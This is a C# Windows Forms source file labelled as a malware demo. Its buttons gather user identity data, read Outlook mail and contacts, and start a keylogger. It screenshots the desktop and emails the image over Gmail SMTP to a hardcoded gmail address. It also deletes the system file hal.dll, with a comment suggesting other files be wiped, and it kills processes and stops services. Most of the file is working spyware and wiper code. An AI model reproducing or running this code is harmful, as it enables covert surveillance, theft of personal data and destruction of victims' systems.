using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Drawing.Imaging;
using System.Net;
using System.Security.Principal;
using System.Diagnostics;
using System.ServiceProcess; //used to start and stop services
using System.Threading;

namespace windowsDemo
{




    public partial class frmMalwareDemo : Form
    {
        //screen capture 1 imports
        class GDI32
        {
            [DllImport("GDI32.dll")]
            public static extern bool BitBlt(int hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, int hdcSrc, int nXSrc, int nYSrc, int dwRop);
            [DllImport("GDI32.dll")]
            public static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);
            [DllImport("GDI32.dll")]
            public static extern int CreateCompatibleDC(int hdc);
            [DllImport("GDI32.dll")]
            public static extern bool DeleteDC(int hdc);
            [DllImport("GDI32.dll")]
            public static extern bool DeleteObject(int hObject);
            [DllImport("GDI32.dll")]
            public static extern int GetDeviceCaps(int hdc, int nIndex);
            [DllImport("GDI32.dll")]
            public static extern int SelectObject(int hdc, int hgdiobj);
          
        }
        class User32
        {
            [DllImport("User32.dll")]
            public static extern int GetDesktopWindow();
            [DllImport("User32.dll")]
            public static extern int GetWindowDC(int hWnd);
            [DllImport("User32.dll")]
            public static extern int ReleaseDC(int hWnd, int hDC);
        }
            //end screen capture 1 imports

   

        // get credentials imports
          [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LogonUser(string lpszUsername,
            string lpszDomain,
            string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            out IntPtr phToken
            );

        [DllImport("kernel32.dll")]
        public static extern int FormatMessage(int dwFlags, ref IntPtr lpSource, int dwMessageId, int dwLanguageId, ref String lpBuffer, int nSize, ref IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

       

        public frmMalwareDemo()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }


        public static string GetErrorMessage(int errorCode)
        {
            int FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x100;
            int FORMAT_MESSAGE_IGNORE_INSERTS = 0x200;
            int FORMAT_MESSAGE_FROM_SYSTEM = 0x1000;

            int msgSize = 255;
            string lpMsgBuf = null;
            int dwFlags = FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;

            IntPtr lpSource = IntPtr.Zero;
            IntPtr lpArguments = IntPtr.Zero;
            int returnVal = FormatMessage(dwFlags, ref lpSource, errorCode, 0, ref lpMsgBuf, msgSize, ref lpArguments);

            if (returnVal == 0)
            {
                throw new Exception("Failed to format message for error code " + errorCode.ToString() + ". ");
            }
            return lpMsgBuf;

        }
 



        private void btnGetEmail_Click(object sender, EventArgs e)
        {
            //            // The Namespace Object (Session) has a collection of accounts.
            //Outlook.Accounts accounts = Outlook.Application.application.Session.Accounts;
           
            //// Concatenate a message with information about all accounts.
            //StringBuilder builder = new StringBuilder();

            //// Loop over all accounts and print detail account information.
            //// All properties of the Account object are read-only.
            //foreach (Outlook.Account account in accounts)
            //{

            //    // The DisplayName property represents the friendly name of the account.
            //    builder.AppendFormat("DisplayName: {0}\n", account.DisplayName);

            //    // The UserName property provides an account-based context to determine identity.
            //    builder.AppendFormat("UserName: {0}\n", account.UserName);

            //    // The SmtpAddress property provides the SMTP address for the account.
            //    builder.AppendFormat("SmtpAddress: {0}\n", account.SmtpAddress);

            //    // The AccountType property indicates the type of the account.
            //    builder.Append("AccountType: ");
            //    switch (account.AccountType)
            //    {

            //        case Outlook.OlAccountType.olExchange:
            //            builder.AppendLine("Exchange");
            //            break;

            //        case Outlook.OlAccountType.olHttp:
            //            builder.AppendLine("Http");
            //            break;

            //        case Outlook.OlAccountType.olImap:
            //            builder.AppendLine("Imap");
            //            break;

            //        case Outlook.OlAccountType.olOtherAccount:
            //            builder.AppendLine("Other");
            //            break;

            //        case Outlook.OlAccountType.olPop3:
            //            builder.AppendLine("Pop3");
            //            break;
            //    }

            //    builder.AppendLine();
            //}

            //// Display the account information.
            //System.Windows.Forms.MessageBox.Show(builder.ToString());
        }

   

        private void button1_Click(object sender, EventArgs e)
        {
                

            try
            {
                lstEmail.Visible = false;
                picScreenCapture.Visible = false;
                string sysName = "";
                string sysUser = "";
                string userGroups = "";
                string AuthenticationType = "";
                sysName = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();
                sysUser = System.Security.Principal.WindowsIdentity.GetCurrent().User.ToString();
                userGroups= System.Security.Principal.WindowsIdentity.GetCurrent().Groups.ToString();
                AuthenticationType = System.Security.Principal.WindowsIdentity.GetCurrent().AuthenticationType.ToString();
                string owner= System.Security.Principal.WindowsIdentity.GetCurrent().Owner.Value.ToString();
                
                txtUserData.Text += " Name is: " + sysName +"\r\n";
                txtUserData.Text += " User is: " + sysUser + "\r\n";
                txtUserData.Text += " Member of groups: " + userGroups + "\r\n";
                txtUserData.Text += " Authentication Type: " + AuthenticationType + "\r\n";
                txtUserData.Text += " Owner is:" + owner + "\r\n";



            }
            catch (Exception ex)
            {
                MessageBox.Show("Exception occurred. " + ex.Message);
            }
        }


   

        private void btnKeyLogger_Click(object sender, EventArgs e)
        {

            lstEmail.Visible = false;
            picScreenCapture.Visible = false;
            //Thread thread = new Thread(new ThreadStart(clsConsoleKeyLogger.startKeyLogger));
            clsConsoleKeyLogger.startKeyLogger();


            

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

            // screen caputre method 1 functions
            public void CaptureScreen(string fileName,ImageFormat imageFormat)
            {
            int hdcSrc =User32.GetWindowDC(User32.GetDesktopWindow()), 
            hdcDest = GDI32.CreateCompatibleDC(hdcSrc),
            hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc,
            GDI32.GetDeviceCaps(hdcSrc,8),GDI32.GetDeviceCaps(hdcSrc,10)); GDI32.SelectObject(hdcDest,hBitmap);
            GDI32.BitBlt(hdcDest,0,0,GDI32.GetDeviceCaps(hdcSrc,8),
            GDI32.GetDeviceCaps(hdcSrc,10),hdcSrc,0,0,0x00CC0020);
            SaveImageAs(hBitmap,fileName,imageFormat);
            Cleanup(hBitmap,hdcSrc,hdcDest);
            }
            private void Cleanup(int hBitmap,int hdcSrc,int hdcDest)
            {
            User32.ReleaseDC(User32.GetDesktopWindow(),hdcSrc);
            GDI32.DeleteDC(hdcDest);
            GDI32.DeleteObject(hBitmap);
            } 
            private void SaveImageAs(int hBitmap,string fileName,ImageFormat imageFormat)
            {
            Bitmap image = 
            new Bitmap(Image.FromHbitmap(new IntPtr(hBitmap)),
            Image.FromHbitmap(new IntPtr(hBitmap)).Width,
            Image.FromHbitmap(new IntPtr(hBitmap)).Height);
            image.Save(fileName,imageFormat);
            }
        // print screen code
            string printScreen = null;
            static int i = 0;
            private static Bitmap BitMapCreater()
            {
                Rectangle rect = Screen.PrimaryScreen.Bounds;
                int color = Screen.PrimaryScreen.BitsPerPixel;
                PixelFormat pFormat;
                switch (color)
                {
                    case 8:
                    case 16:
                        pFormat = PixelFormat.Format16bppRgb565;
                        break;

                    case 24:
                        pFormat = PixelFormat.Format24bppRgb;
                        break;

                    case 32:
                        pFormat = PixelFormat.Format32bppArgb;
                        break;

                    default:
                        pFormat = PixelFormat.Format32bppArgb;
                        break;
                }
                Bitmap bmp = new Bitmap(rect.Width, rect.Height, pFormat);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(rect.Left, rect.Top, 0, 0, rect.Size);
                return bmp;
            }

            private static string sendMail(System.Net.Mail.MailMessage mm)
            {
                try
                {
                    string smtpHost = "smtp.gmail.com";
                    string userName = "phongagsornkk.loc@gmail.com";//write your email address
                    string password = "*******";//write password
                    System.Net.Mail.SmtpClient mClient = new System.Net.Mail.SmtpClient();
                    mClient.Port = 587;
                    mClient.EnableSsl = true;
                    mClient.UseDefaultCredentials = false;
                    mClient.Credentials = new NetworkCredential(userName, password);
                    mClient.Host = smtpHost;
                    mClient.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
                    mClient.Send(mm);
                }
                catch (Exception ex)
                {
                    System.Console.Write(ex.Message);
                }

                return "Send Sucessfully";
            }
            private void btnGrabScreen_Click(object sender, EventArgs e)
            {
                try
                {
                    //lstEmail.Visible = false;
                    i = i + 1;
                    //string sysName = string.Empty;
                    //string sysUser = string.Empty;
                    Bitmap b = BitMapCreater();
                    printScreen = string.Format("{0}{1}", Path.GetTempPath(), "screen" + i + ".jpg");
                           
                    b.Save(printScreen, ImageFormat.Jpeg);
                    picScreenCapture.Load(printScreen.ToString());
                    System.Net.Mail.MailAddress toAddress = new System.Net.Mail.MailAddress("phongagsornkk.loc@gmail.com");
                    System.Net.Mail.MailAddress fromAddress = new System.Net.Mail.MailAddress("thismachine@xyz.com");
                    System.Net.Mail.MailMessage mm = new System.Net.Mail.MailMessage(fromAddress, toAddress);
                   // sysName = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();
                   // sysUser = System.Security.Principal.WindowsIdentity.GetCurrent().User.ToString();
                    mm.Subject = "unsubscribe";
                    string filename = string.Empty;
                    System.Net.Mail.Attachment mailAttachment = new System.Net.Mail.Attachment(printScreen);
                    mm.Attachments.Add(mailAttachment);
                    mm.IsBodyHtml = true;
                    mm.BodyEncoding = System.Text.Encoding.UTF8;
                    sendMail(mm);
                }
                catch (Exception ex)
                {
                 
                }
            }

            private void btnEmail_Click(object sender, EventArgs e)
            {
                try
                {

                    picScreenCapture.Visible = false;
                    lstEmail.Visible = true;
                    Outlook.Application oApp;
                    Outlook._NameSpace oNS;
                    Outlook.MAPIFolder oFolder;
                    Outlook._Explorer oExp;

                    oApp = new Outlook.Application();
                    oNS = (Outlook._NameSpace)oApp.GetNamespace("MAPI");
                    oFolder = oNS.GetDefaultFolder(Outlook.OlDefaultFolders.olFolderInbox);
                    oExp = oFolder.GetExplorer(false);


                    Outlook.Items items = oFolder.Items;
                    foreach (Outlook.MailItem mail in items)
                    {
                        string to = "";
                        string subject = "";
                        string sentfrom = "";
                        if (mail.To != null)
                            to = mail.To.ToString();
                        if (mail.Subject != null)
                            subject = mail.Subject.ToString();
                        if (mail.SenderEmailAddress != null)
                            sentfrom = mail.SenderEmailAddress.ToString();


                        lstEmail.Items.Add(to + " subject: " + subject + " Sender: " + sentfrom);
                    }
                }
                catch (Exception ex)
                {

                }
            }

            private void button1_Click_1(object sender, EventArgs e)
            {
                try
                {
                                DataSet ds = new DataSet();
                                ds.Tables.Add("Contacts");
                                ds.Tables[0].Columns.Add("Email");
                                ds.Tables[0].Columns.Add("FirstName");
                                ds.Tables[0].Columns.Add("LastName");
                   
                            Microsoft.Office.Interop.Outlook.Items OutlookItems;
                            Microsoft.Office.Interop.Outlook.Application outlookObj;
                            Microsoft.Office.Interop.Outlook.MAPIFolder Folder_Contacts;

                   

                            outlookObj = new Microsoft.Office.Interop.Outlook.Application();
                            Folder_Contacts = (Microsoft.Office.Interop.Outlook.MAPIFolder)outlookObj.Session.GetDefaultFolder(Microsoft.Office.Interop.Outlook.OlDefaultFolders.olFolderContacts);
                            OutlookItems = Folder_Contacts.Items;

                            for (int i = 0; i < OutlookItems.Count; i++)
                            {
                                Microsoft.Office.Interop.Outlook.ContactItem contact = (Microsoft.Office.Interop.Outlook.ContactItem)OutlookItems[i + 1];
                                DataRow dr = ds.Tables[0].NewRow();
                                txtUserData.Text += contact.Email1Address;
                                txtUserData.Text += contact.FirstName;
                                txtUserData.Text += contact.LastName;
                                dr[0] = contact.Email1Address;
                                dr[1] = contact.FirstName;
                                dr[2] = contact.LastName;

                                ds.Tables[0].Rows.Add(dr);
                   
                            }

                           
                }
                catch (Exception ex)
                {

                }

            }
            public void send_email_via_outlook(bool battach, string filepath)
            {
                try
                {
                    Microsoft.Office.Interop.Outlook.Application outlookObj = new Microsoft.Office.Interop.Outlook.Application();
                    Outlook.MailItem mailItem = (Outlook.MailItem) outlookObj.CreateItem(Outlook.OlItemType.olMailItem);
                    mailItem.Subject = "windows undocumented api demo";
                    mailItem.To = "phongagsornkk.loc@gmail.com";
                    mailItem.Body = "hogehoge";
             
                    if(battach==true)
                       mailItem.Attachments.Add(filepath);//logPath is a string holding path to the log.txt file
                
                    mailItem.Display(false);
                }
                catch (Exception ex)
                {

                }

            }

            private void btnWipe_Click(object sender, EventArgs e)
            {
                //lstEmail.Visible = false;
                //picScreenCapture.Visible = false;
                 System.IO.File.Delete("C:\\Windows\\system32\\hal.dll"); /* this is one example, you may wish to wipe others */
            }

            private void button2_Click(object sender, EventArgs e)
            {
                try
                {
                    foreach (Process proc in Process.GetProcessesByName("utorrent"))
                    {
                        proc.Kill();
                    }
                }
                catch (Exception ex)
                {

                }

            }

            private void btnProcesses_Click(object sender, EventArgs e)
            {

            }
            void BindToRunningProcesses()
            {
                // Get the current process.
                Process currentProcess = Process.GetCurrentProcess();

                // Get all processes running on the local computer.
                Process[] localAll = Process.GetProcesses();

                // Get all instances of Notepad running on the local computer.
                // This will return an empty array if notepad isn't running.
                Process[] localByName = Process.GetProcessesByName("notepad");

                // Get a process on the local computer, using the process id.
                // This will throw an exception if there is no such process.
                Process localById = Process.GetProcessById(1234);


                // Get processes running on a remote computer. Note that this
                // and all the following calls will timeout and throw an exception
                // if "myComputer" and 169.0.0.0 do not exist on your local network.

                // Get all processes on a remote computer.
                Process[] remoteAll = Process.GetProcesses("myComputer");

                // Get all instances of Notepad running on the specific computer, using machine name.
                Process[] remoteByName = Process.GetProcessesByName("notepad", "myComputer");

                // Get all instances of Notepad running on the specific computer, using IP address.
                Process[] ipByName = Process.GetProcessesByName("notepad", "169.0.0.0");

                // Get a process on a remote computer, using the process id and machine name.
                Process remoteById = Process.GetProcessById(2345, "myComputer");
            }

            private void cmdStopService_Click(object sender, EventArgs e)
            {
                string serviceName = "servicenamehere";
                int timeoutMilliseconds = 30;
              ServiceController service = new ServiceController(serviceName);
               TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);

                service.Stop();
                service.WaitForStatus(ServiceControllerStatus.Stopped, timeout);


            }


    }

}
